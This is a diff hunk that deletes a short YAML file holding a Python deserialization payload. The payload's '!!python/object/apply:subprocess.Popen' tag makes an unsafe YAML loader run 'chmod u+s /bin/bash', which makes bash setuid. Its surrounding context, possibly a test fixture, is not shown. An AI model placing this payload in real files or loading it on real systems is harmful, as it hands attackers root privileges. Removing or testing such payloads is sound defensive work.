@@ -1,5 +1,0 @@
-!!python/object/apply:subprocess.Popen
-- !!python/tuple
-  - chmod
-  - u+s
-  - /bin/bash
